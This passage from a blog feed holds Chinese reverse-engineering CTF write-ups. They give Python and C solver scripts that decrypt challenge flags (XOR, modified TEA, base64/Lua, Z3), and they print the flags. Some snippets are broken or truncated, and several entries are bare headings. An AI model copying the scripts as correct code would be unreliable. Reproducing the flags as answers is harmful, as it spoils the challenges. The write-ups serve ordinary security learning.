title="NsPack壳儿"></a>NsPack壳儿</h5><p>[<a href="https://bbs.kanxue.com/thread-115901.htm">原创]NsPack 3.7 浅析 （7.3更新脱壳机和源码）-加壳脱壳-看雪-安全社区|安全招聘|kanxue.com</a></p><p>脱壳后简单分析：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">true_cipher = [<span class="number">0x00000012</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000014</span>, <span class="number">0x00000024</span>,</span><br><span class="line"><span class="number">0x0000005C</span>, <span class="number">0x0000004A</span>, <span class="number">0x0000003D</span>,<span class="number">0x00000056</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000010</span>, <span class="number">0x00000067</span>, <span class="number">0x00000000</span>,<span class="number">0x00000041</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x00000046</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000044</span>, <span class="number">0x00000042</span>, <span class="number">0x0000006E</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x00000072</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000040</span>, <span class="number">0x0000003E</span>, <span class="number">0x0000004B</span>,</span><br><span class="line"><span class="number">0x0000005F</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>,</span><br><span class="line"><span class="number">0x0000004C</span>, <span class="number">0x0000005E</span>, <span class="number">0x0000005B</span>, <span class="number">0x00000017</span>, <span class="number">0x0000006E</span>,</span><br><span class="line"><span class="number">0x0000000C</span>, <span class="number">0x00000016</span>, <span class="number">0x00000068</span>,</span><br><span class="line"><span class="number">0x0000005B</span>, <span class="number">0x00000012</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000048</span>]</span><br><span class="line">XOR = [<span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(true_cipher)):</span><br><span class="line">flag += <span class="built_in">chr</span>(true_cipher[j] ^ XOR[j % <span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;59b8ed8f-af22-11e7-bb4a-3cf862d1ee75&#125;</span></span><br></pre></td></tr></table></figure><h2 id="10-ezmath"><a href="#10-ezmath" class="headerlink" title="10.ezmath"></a>10.ezmath</h2><h5 id="exe-py-Z3求解器"><a href="#exe-py-Z3求解器" class="headerlink" title="exe-py-Z3求解器"></a>exe-py-Z3求解器</h5><p>(?要经常更新pyexe库啊。。)</p><p>其实这个题还是很考验分析的，</p><p>太长了分开</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">&quot;sum([flag[23] for _ in range(flag[23])]) + sum([flag[12] for _ in range(flag[12])]) + sum([flag[1] for _ in range(flag[1])]) - sum([flag[24] for _ in range(222)]) + sum([flag[22] for _ in range(flag[22])]) + sum([flag[31] for _ in range(flag[31])]) + sum([flag[26] for _ in range(flag[26])]) - sum([flag[9] for _ in range(178)]) - sum([flag[29] for _ in range(232)]) + sum([flag[17] for _ in range(flag[17])]) - sum([flag[23] for _ in range(150)]) - sum([flag[6] for _ in range(226)]) - sum([flag[7] for _ in range(110)]) + sum([flag[19] for _ in range(flag[19])]) + sum([flag[2] for _ in range(flag[2])]) - sum([flag[0] for _ in range(176)]) + sum([flag[10] for _ in range(flag[10])]) - sum([flag[12] for _ in range(198)]) + sum([flag[24] for _ in range(flag[24])]) + sum([flag[9] for _ in range(flag[9])]) - sum([flag[3] for _ in range(168)]) + sum([flag[8] for _ in range(flag[8])]) - sum([flag[2] for _ in range(134)]) + sum([flag[14] for _ in range(flag[14])]) - sum([flag[13] for _ in range(170)]) + sum([flag[4] for _ in range(flag[4])]) - sum([flag[10] for _ in range(142)]) + sum([flag[27] for _ in range(flag[27])]) + sum([flag[15] for _ in range(flag[15])]) - sum([flag[15] for _ in range(224)]) + sum([flag[16] for _ in range(flag[16])]) - sum([flag[11] for _ in range(230)]) - sum([flag[1] for _ in range(178)]) + sum([flag[28] for _ in range(flag[28])]) - sum([flag[5] for _ in range(246)]) - sum([flag[17] for _ in range(168)]) + sum([flag[30] for _ in range(flag[30])]) - sum([flag[21] for _ in range(220)]) - sum([flag[22] for _ in range(212)]) - sum([flag[16] for _ in range(232)]) + sum([flag[25] for _ in range(flag[25])]) - sum([flag[4] for _ in range(140)]) - sum([flag[31] for _ in range(250)]) - sum([flag[28] for _ in range(150)]) + sum([flag[11] for _ in range(flag[11])]) + sum([flag[13] for _ in range(flag[13])]) - sum([flag[14] for _ in range(234)]) + sum([flag[7] for _ in range(flag[7])]) - sum([flag[8] for _ in range(174)]) + sum([flag[3] for _ in range(flag[3])]) - sum([flag[25] for _ in range(242)]) + sum([flag[29] for _ in range(flag[29])]) + sum([flag[5] for _ in range(flag[5])]) - sum([flag[30] for _ in range(142)]) - sum([flag[26] for _ in range(170)]) - sum([flag[19] for _ in range(176)]) + sum([flag[0] for _ in range(flag[0])]) - sum([flag[27] for _ in range(168)]) + sum([flag[20] for _ in range(flag[20])]) - sum([flag[20] for _ in range(212)]) + sum([flag[21] for _ in range(flag[21])]) + sum([flag[6] for _ in range(flag[6])]) + sum([flag[18] for _ in range(flag[18])]) - sum([flag[18] for _ in range(178)])&quot;</span></span><br><span class="line">temp = data.split(<span class="string">&quot; + &quot;</span>)</span><br><span class="line">final = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    final = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> temp:</span><br><span class="line">        t=j.split(<span class="string">&quot; - &quot;</span>)</span><br><span class="line">            final.extend(t)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> final:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">f&quot;flag[<span class="subst">&#123;j&#125;</span>]&quot;</span> <span class="keyword">in</span> k:</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line"> <span class="comment">####</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">176</span>)]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">0</span>])]) </span><br><span class="line"><span class="number">1</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">1</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">1</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">178</span>)]) </span><br><span class="line"><span class="number">2</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">2</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">2</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">134</span>)]) </span><br><span class="line"><span class="number">3</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">168</span>)]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">3</span>])]) </span><br><span class="line"><span class="number">4</span></span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">4</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag[<span class="number">4</span>])]) </span><br><span class="line"> <span class="built_in">sum</span>([flag[<span class="number">4</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">140</span>)]) </span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429234131401.png" alt="image-20240429234131401"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240429234223092.png" alt="image-20240429234223092"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="11-给阿姨倒一杯卡布奇诺"><a href="#11-给阿姨倒一杯卡布奇诺" class="headerlink" title="11.给阿姨倒一杯卡布奇诺"></a><strong>11.给阿姨倒一杯卡布奇诺</strong></h2><h5 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="built_in">array</span>[<span class="number">0</span>] = <span class="number">0x9B28ED45</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">  <span class="built_in">array</span>[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">sum += <span class="number">0x6E75316C</span>;</span><br><span class="line">data1           dd <span class="number">5F</span>797274h            ; DATA XREF: encrypt+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">0000000000403010</span>                                         ; encrypt+<span class="number">33</span>↑w ...</span><br><span class="line">.data:<span class="number">0000000000403014</span>                 public data2</span><br><span class="line">.data:<span class="number">0000000000403014</span> ; <span class="type">uint32_t</span> data2</span><br><span class="line">.data:<span class="number">0000000000403014</span> data2           dd <span class="number">64726168</span>h            ; DATA XREF: encrypt+<span class="number">39</span>↑r</span><br><span class="line">.data:<span class="number">0000000000403014</span>                                </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> data1 = <span class="number">0x5F797274</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> data2 = <span class="number">0x64726168</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypto</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *cipher, <span class="type">unsigned</span> <span class="type">int</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0, v1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t0, t1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> sum = <span class="number">0x6E75316C</span>ULL * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    v0 = *cipher;</span><br><span class="line">v1 = cipher[<span class="number">1</span>];</span><br><span class="line">t0 = v0;</span><br><span class="line">t1 = v1;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]) ^ (v0 + sum) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v0) ^ (sum +i);</span><br><span class="line">v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]) ^ (v1 + sum) ^ (*key + <span class="number">16</span> * v1) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*cipher = v0 ^ data1;</span><br><span class="line">cipher[<span class="number">1</span>] = v1 ^ data2;</span><br><span class="line">data1 = t0;</span><br><span class="line">data2 = t1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cipher[<span class="number">8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> length, i;</span><br><span class="line">cipher[<span class="number">0</span>] = <span class="number">2603150661</span>;</span><br><span class="line">cipher[<span class="number">1</span>] = <span class="number">0x145EC6E9</span>;</span><br><span class="line">cipher[<span class="number">2</span>] = <span class="number">0x5B27A6C3</span>;</span><br><span class="line">cipher[<span class="number">3</span>] = <span class="number">0xE59E75D5</span>;</span><br><span class="line">cipher[<span class="number">4</span>] = <span class="number">0xE82C2500</span>;</span><br><span class="line">cipher[<span class="number">5</span>] = <span class="number">0xA4211D92</span>;</span><br><span class="line">cipher[<span class="number">6</span>] = <span class="number">0xCD8A4B62</span>;</span><br><span class="line">cipher[<span class="number">7</span>] = <span class="number">0xA668F440</span>;</span><br><span class="line">key[<span class="number">0</span>] = <span class="number">0x65766967</span>;</span><br><span class="line">key[<span class="number">1</span>] = <span class="number">0x756F795F</span>;</span><br><span class="line">key[<span class="number">2</span>] = <span class="number">0x7075635F</span>;</span><br><span class="line">key[<span class="number">3</span>] = <span class="number">0x6165745F</span>;</span><br><span class="line">length = <span class="keyword">sizeof</span>(cipher);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *in = (<span class="type">unsigned</span> <span class="type">int</span> *)cipher;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *out = (<span class="type">unsigned</span> <span class="type">char</span> *)cipher;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    decrypto(in + i, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, out[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;133bffe401d223a02385d90c5f1ca377&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240430002632073.png" alt="image-20240430002632073"></p><h2 id="12-what’s-this"><a href="#12-what’s-this" class="headerlink" title="12.what’s this"></a>12.<strong>what’s this</strong></h2><h5 id="Lua加密？"><a href="#Lua加密？" class="headerlink" title="Lua加密？"></a>Lua加密？</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240430010432485.png" alt="image-20240430010432485"></p><p>使用XOR函数将字符与数字8进行异或操作，再加上3，base64加密，再进行字符替换</p><p>直接逆向逻辑，exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span></span><br><span class="line">new_cipher = cipher[::-<span class="number">1</span>]</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;4&quot;</span>, <span class="string">&quot;H&quot;</span>)</span><br><span class="line">new_cipher = new_cipher.replace(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;W&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Xor</span>(<span class="params">num1, num2</span>):</span><br><span class="line">tmp1 = num1</span><br><span class="line">tmp2 = num2</span><br><span class="line">str_result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> tmp1 != <span class="number">0</span> <span class="keyword">or</span> tmp2 != <span class="number">0</span>:</span><br><span class="line">s1 = tmp1 % <span class="number">2</span></span><br><span class="line">s2 = tmp2 % <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> s1 == s2:</span><br><span class="line">str_result = <span class="string">&quot;0&quot;</span> + str_result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">str_result = <span class="string">&quot;1&quot;</span> + str_result</span><br><span class="line">tmp1 = tmp1 // <span class="number">2</span></span><br><span class="line">tmp2 = tmp2 // <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(str_result, <span class="number">2</span>)</span><br><span class="line">d_cipher = base64.b64decode(new_cipher)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> d_cipher:</span><br><span class="line">flag += <span class="built_in">chr</span>(Xor(char - <span class="number">3</span>, <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;5dcbaed781363fbfb7d8647c1aee6c&#125;</span></span><br></pre></td></tr></table></figure><h2 id="13-馒头"><a href="#13-馒头" class="headerlink" title="13.馒头"></a>13.馒头</h2><h5 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x000008DE</span>, <span class="number">0x00000395</span>, <span class="number">0x000001BE</span>, <span class="number">0x000000D9</span>, <span class="number">0x0000006A</span>, <span class="number">0x00000033</span>,</span><br><span class="line"><span class="number">0x00000014</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000011</span>,</span><br><span class="line"><span class="number">0x000000E5</span>, <span class="number">0x00000072</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000B</span>, <span class="number">0x000001D7</span>, <span class="number">0x000000E9</span>,</span><br><span class="line"><span class="number">0x00000074</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000D</span>,</span><br><span class="line"><span class="number">0x000000EE</span>, <span class="number">0x00000076</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000007</span>, <span class="number">0x00000549</span>, <span class="number">0x0000022D</span>,</span><br><span class="line"><span class="number">0x000000F8</span>, <span class="number">0x0000007B</span>, <span class="number">0x00000006</span>,</span><br><span class="line"><span class="number">0x00000018</span>, <span class="number">0x00000135</span>, <span class="number">0x00000089</span>, <span class="number">0x00000043</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>,</span><br><span class="line"><span class="number">0x000000AC</span>, <span class="number">0x00000054</span>, <span class="number">0x00000004</span>,</span><br><span class="line"><span class="number">0x00000001</span>, <span class="number">0x0000031C</span>, <span class="number">0x0000017F</span>, <span class="number">0x000000BA</span>, <span class="number">0x00000059</span>, <span class="number">0x00000002</span>,</span><br><span class="line"><span class="number">0x00000008</span>, <span class="number">0x000000C5</span>, <span class="number">0x00000061</span>,</span><br><span class="line"><span class="number">0x00000030</span>, <span class="number">0x00000017</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000015</span>, <span class="number">0x0000019D</span>, <span class="number">0x000000CB</span>,</span><br><span class="line"><span class="number">0x00000065</span>, <span class="number">0x00000016</span>, <span class="number">0x00000009</span>,</span><br><span class="line"><span class="number">0x000000D2</span>, <span class="number">0x00000068</span>, <span class="number">0x00000013</span>, <span class="number">0x00000012</span>]</span><br><span class="line">num = []</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">num.append(data[i])</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[2270, 917, 446, 217, 106, 51, 20, 15, 17, 229, 114, 16, 11, 471, 233, 116, 14,</span></span><br><span class="line"><span class="number">13</span>, <span class="number">238</span>, <span class="number">118</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1353</span>, <span class="number">557</span>, <span class="number">248</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">309</span>, <span class="number">137</span>, <span class="number">67</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">172</span>, <span class="number">84</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">796</span>, <span class="number">383</span>, <span class="number">186</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">197</span>, <span class="number">97</span>, <span class="number">48</span>, <span class="number">23</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">413</span>, <span class="number">203</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">9</span>, <span class="number">210</span>,</span><br><span class="line"><span class="number">104</span>, <span class="number">19</span>, <span class="number">18</span>]</span><br></pre></td></tr></table></figure><h2 id="15-舔狗四部曲—记忆的时光机"><a href="#15-舔狗四部曲—记忆的时光机" class="headerlink" title="15.舔狗四部曲—记忆的时光机"></a>15.舔狗四部曲—记忆的时光机</h2><h5 id="linux动态调试-看汇编（qwq"><a href="#linux动态调试-看汇编（qwq" class="headerlink" title="linux动态调试  看汇编（qwq"></a>linux动态调试  看汇编（qwq</h5><h2 id="16-舔狗四部曲—简爱"><a href="#16-舔狗四部曲—简爱" class="headerlink" title="16.舔狗四部曲—简爱"></a>16.舔狗四部曲—简爱</h2><h5 id="o编译"><a href="#o编译" class="headerlink" title=".o编译 ?"></a>.o编译 ?</h5><h2 id="17-舔狗四部曲—相逢已是上上签"><a href="#17-舔狗四部曲—相逢已是上上签" class="headerlink" title="17.舔狗四部曲—相逢已是上上签"></a>17.舔狗四部曲—相逢已是上上签</h2><h5 id="修复损坏的DOS文件-魔改key的xxtea"><a href="#修复损坏的DOS文件-魔改key的xxtea" class="headerlink" title="修复损坏的DOS文件  魔改key的xxtea"></a>修复损坏的DOS文件  魔改key的xxtea</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240501003325519.png" alt="image-20240501003325519"></p><h2 id="18-舔狗四部曲—我的白月光"><a href="#18-舔狗四部曲—我的白月光" class="headerlink" title="18.舔狗四部曲—我的白月光"></a>18.舔狗四部曲—我的白月光</h2><h5 id="什么病毒？"><a href="#什么病毒？" class="headerlink" title="什么病毒？"></a>什么病毒？</h5><h2 id="19-ez-enc"><a href="#19-ez-enc" class="headerlink" title="19.ez_enc"></a>19.ez_enc</h2><p>z3</p><h2 id="20-easy-lauguage"><a href="#20-easy-lauguage" class="headerlink" title="20.easy lauguage"></a>20.easy lauguage</h2><p>base64+AES</p><p>没换表</p><h2 id="21-钩子"><a href="#21-钩子" class="headerlink" title="21.钩子"></a>21.钩子</h2><h5 id="反调试-hook-rc4"><a href="#反调试-hook-rc4" class="headerlink" title="反调试 hook rc4"></a>反调试 hook rc4</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Re百题计划（&quot;&gt;&lt;a href=&quot;#Re百题计划（&quot; class=&quot;headerlink&quot; title=&quot;Re百题计划（&quot;&gt;&lt;/a&gt;Re百题计划（&lt;/h1&gt;&lt;h2 id=&quot;1-你是真的大学生吗？&quot;&gt;&lt;a href=&quot;#1-你是真的大学生吗？&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/04/16/NSSCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/04/16/NSSCTF/</id>
    <published>2024-04-15T16:00:00.000Z</published>
    <updated>2024-09-16T07:16:24.924Z</updated>
    
